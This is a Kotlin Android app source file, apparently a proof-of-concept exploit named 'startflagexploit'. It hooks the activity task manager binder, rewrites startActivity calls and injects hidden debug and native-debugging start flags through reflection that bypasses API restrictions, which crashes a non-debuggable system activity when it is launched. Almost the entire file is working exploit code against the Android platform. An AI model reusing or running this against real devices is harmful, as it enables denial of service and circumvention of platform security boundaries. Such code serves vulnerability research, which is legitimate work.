package org.chickenhook.startflagexploit

import android.Manifest
import android.app.ActivityManager
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.os.IBinder
import android.os.Parcel
import android.util.Log
import android.widget.Button
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import org.chickenhook.binderhooks.Logger
import org.chickenhook.binderhooks.OnBinderListener
import org.chickenhook.binderhooks.ServiceHooks
import org.chickenhook.restrictionbypass.helpers.Reflection
import org.chickenhook.restrictionbypass.helpers.Reflection.getReflective

class MainActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        findViewById<Button>(R.id.start_button)?.setOnClickListener {
            crash()
        }
    }



    fun startActivityHook(
        originalBinder: IBinder,
        code: Int,
        data: Parcel,
        reply: Parcel?,
        flags: Int, DESCRIPTOR: String
    ): Boolean {
        Log.d("MainActivity", "Manipulate start activity")
        val _data = Parcel.obtain()
        data.setDataPosition(0)
        data.writeInterfaceToken(DESCRIPTOR); // validation
        _data.writeInterfaceToken(DESCRIPTOR)
        val caller = data.readStrongBinder()
        _data.writeStrongBinder(caller)
        val callingPackage = data.readString()
        _data.writeString(callingPackage) // manipulate calling package
        //_data.writeString("com.android.chrome") // manipulate calling package
        if (Build.VERSION.CODENAME == "R") {
            val unknown = data.readString()
            _data.writeString(unknown)
        }
        val hasIntent = data.readInt()
        if (hasIntent == 0) {
            // no intent
            _data.writeInt(0)
            originalBinder.transact(code, data, reply, flags)

        } else {
            // has intent
            _data.writeInt(1)
            val intent = Intent()
            intent.readFromParcel(data)

            //val newIntent = createTrampolineIntent(loaderContext, intent)
            intent.writeToParcel(_data, 0)
        }
        _data.writeString(data.readString()); // resolved type
        val strongBinder = data.readStrongBinder()
        Log.d("MainActivity", "BinderProxy $strongBinder")
        _data.writeStrongBinder(
            strongBinder
        ); // result to
//        _data.writeStrongBinder(strongBinder); // result to
        val resultWho = data.readString()
        _data.writeString(resultWho); // result who
//        _data.writeString(resultWho);
        _data.writeInt(data.readInt()); // request code
        _data.writeInt(
            data.readInt()

             /**
              * This will create the crash!
              */
                    or (getReflective(
                null,
                ActivityManager::class.java,
                "START_FLAG_DEBUG"
            )!!)

                    or (getReflective(
                null,
                ActivityManager::class.java,
                "START_FLAG_TRACK_ALLOCATION"
            )!!)

                    or (getReflective(
                null,
                ActivityManager::class.java,
                "START_FLAG_NATIVE_DEBUGGING"
            )!!)


        ); // flags
        val hasProfileInfo = _data.readInt()
        if (hasProfileInfo == 0) {
            _data.writeInt(0)
        } else {
            _data.writeInt(1) //TODO not supported in hooks :( PRAY!!
            Reflection.getReflective<Any>(
                null,
                Class.forName("android.app.ProfilerInfo"),
                "CREATOR"
            )
                ?.let {
                    val creator = it::class.java.getDeclaredMethod(
                        "createFromParcel",
                        Parcel::class.java
                    )
                    val profilerInfo = creator(data)
                    _data.writeInt(0) //TODO not supported in hooks :( PRAY!!
                } ?: run {
                throw RuntimeException("Unable to read profile Info... Abort")
            }
        }
        val hasOptions = data.readInt()
        if (hasOptions == 0) {
            _data.writeInt(0)
        } else {
            _data.writeInt(1)
            val options = data.readBundle()
            _data.writeBundle(options)
        }

        Logger.log("BinderHook [+] send manipulated startActivity() call")
        return originalBinder.transact(code, _data, reply, flags)
    }


    fun crash(){
        ServiceHooks.hookActivityTaskManager(object :
            OnBinderListener() {
            val DESCRIPTOR = "android.app.IActivityTaskManager"

            override fun transact(
                originalBinder: IBinder,
                code: Int,
                data: Parcel,
                reply: Parcel?,
                flags: Int
            ): Boolean {

                if (code == 1) { // start activity
                    return startActivityHook(
                        originalBinder,
                        code,
                        data,
                        reply,
                        flags,
                        DESCRIPTOR
                    )
                }

                return originalBinder.transact(code, data, reply, flags)
            }
        })

        /**
         * Launch any non debuggable activity.
         */
        ActivityCompat.requestPermissions(
            this@MainActivity,
            arrayOf(Manifest.permission.READ_CONTACTS),
            1001
        )
    }
}
